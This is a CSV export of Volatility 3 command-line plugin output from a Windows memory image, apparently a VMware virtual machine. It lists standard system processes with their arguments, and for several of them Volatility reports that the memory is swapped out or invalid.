Volatility 3 Framework 2.8.0,,
,,
PID,Process,Args
,,
4,System,Required memory at 0x20 is inaccessible (swapped)
92,Registry,Required memory at 0x20 is not valid (process exited?)
300,smss.exe,Process 300: Required memory at 0x8141d08000 is not valid (incomplete layer memory_layer?)
416,csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
492,wininit.exe,Required memory at 0x8dd111f020 is inaccessible (swapped)
512,csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
588,winlogon.exe,winlogon.exe
628,services.exe,C:\Windows\system32\services.exe
636,lsass.exe,C:\Windows\system32\lsass.exe
748,fontdrvhost.ex,Required memory at 0x1ef2831020 is not valid (process exited?)
752,fontdrvhost.ex,Required memory at 0x22512c41a28 is inaccessible (swapped)
764,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
872,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS -p
956,dwm.exe,dwm.exe
440,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p
420,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
656,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
1040,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
1112,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p
1260,svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService -p
1452,MemCompression,Required memory at 0x20 is not valid (process exited?)
1520,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
1680,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel -p
1688,svchost.exe,Required memory at 0xb59a32b020 is inaccessible (swapped)
1696,svchost.exe,Required memory at 0x71e9c1e020 is inaccessible (swapped)
1864,spoolsv.exe,C:\Windows\System32\spoolsv.exe
1944,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
1952,svchost.exe,Required memory at 0xad7a360020 is inaccessible (swapped)
2080,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc -p
2216,wlms.exe,Process 2216: Required memory at 0x184900b10000 is not valid (incomplete layer memory_layer?)
2232,vm3dservice.ex,Required memory at 0x152614c1ae8 is inaccessible (swapped)
2248,vmtoolsd.exe,Required memory at 0x18f2c40211c is inaccessible (swapped)
2256,VGAuthService.,Process 2256: Required memory at 0x14848c80000 is not valid (incomplete layer memory_layer?)
2272,MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe
2388,vm3dservice.ex,Required memory at 0x1e874be1ae8 is inaccessible (swapped)
